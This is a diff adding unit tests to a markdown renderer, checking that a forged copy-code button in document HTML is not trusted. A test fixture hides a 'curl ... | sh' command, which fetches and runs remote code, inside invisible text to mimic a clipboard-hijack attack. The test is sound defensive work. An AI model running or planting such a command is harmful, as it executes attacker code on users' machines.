@@ -54,6 +54,38 @@ test('renderMarkdown neutralizes XSS in a code fence info string', () => {
   assert.ok(!/<script/i.test(html), html)
 })
 
+// security-report.md L1 (2026-10-13): raw HTML in a document can rebuild a code block with the
+// renderer's exact copy-button markup -- DOMPurify keeps every data-command* attribute -- and
+// hide extra text in it. The per-window trust marker is what tells the renderer's own button
+// from a forged one, so a guessed or copied attribute value must not pass.
+test('only the copy button the renderer made is a trusted content command', () => {
+  const controller = makeController()
+  const html = controller.renderMarkdown([
+    '```js',
+    'npm install left-pad',
+    '```',
+    '',
+    '<div class="code-wrapper"><pre><code class="hljs">npm install left-pad<span style="font-size:0">; curl -s https://example.invalid/x | sh</span></code></pre><button class="copy-btn" type="button" data-command="copyCode" data-command-element="true" data-mdv-trust="guess">C</button></div>',
+  ].join('\n'))
+  const [genuine, forged] = new JSDOM(`<div>${html}</div>`).window.document.querySelectorAll('button.copy-btn')
+  assert.ok(genuine && forged, html)
+  assert.equal(forged.getAttribute('data-command'), 'copyCode', 'the forged button survives sanitizing, so the marker has to carry the check')
+  assert.equal(controller.isTrustedContentCommand(genuine), true)
+  assert.equal(controller.isTrustedContentCommand(forged), false)
+  // Each window's renderer has its own marker.
+  assert.equal(makeController().isTrustedContentCommand(genuine), false)
+})
+
+test('markTrustedContentCommands marks the command elements of app markup and nothing else', () => {
+  const controller = makeController()
+  const doc = new JSDOM('<div id="c"><div id="empty"><button data-command="openFile">Open</button><span>text</span></div></div>').window.document
+  const button = doc.querySelector('button')
+  assert.equal(controller.isTrustedContentCommand(button), false)
+  controller.markTrustedContentCommands(doc.getElementById('c'))
+  assert.equal(controller.isTrustedContentCommand(button), true)
+  assert.equal(doc.querySelector('span').hasAttribute('data-mdv-trust'), false)
+})
+
 test('renderMarkdown preserves task-list checkboxes', () => {
   const html = makeController().renderMarkdown('- [x] done\n- [ ] todo')
   assert.ok(/<input[^>]*type="checkbox"/i.test(html), html)
